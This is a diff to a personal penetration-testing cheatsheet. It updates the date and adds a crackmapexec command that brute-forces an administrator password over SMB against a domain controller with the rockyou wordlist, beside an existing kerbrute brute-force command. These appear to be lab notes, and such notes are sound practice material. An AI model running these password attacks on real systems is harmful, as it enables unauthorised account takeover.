@@ -1,5 +1,5 @@
 # My Notes / Cheatsheet
-### Last Updated: 01 Jul 2021
+### Last Updated: 06 Jul 2021
 Notes related to Vuln Assmnt/PenTesting 
 
 #### Approach for Compromising a box
@@ -259,3 +259,4 @@ test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j
 es-shortlist.txt```
 > 2. Try bruteforcing password for a user ```/home/jon/Downloads/kerbrute_linux_amd64 bruteuser --dc 192.168.10.39 -d controller.local /usr/share/wordlists/rockyou.txt adminis
 trator```
+> 3. Using crackmap exec to bruteforce a user password ```crackmapexec smb 192.168.10.39 -u administrator -d controller.local -p /usr/share/wordlists/rockyou.txt```
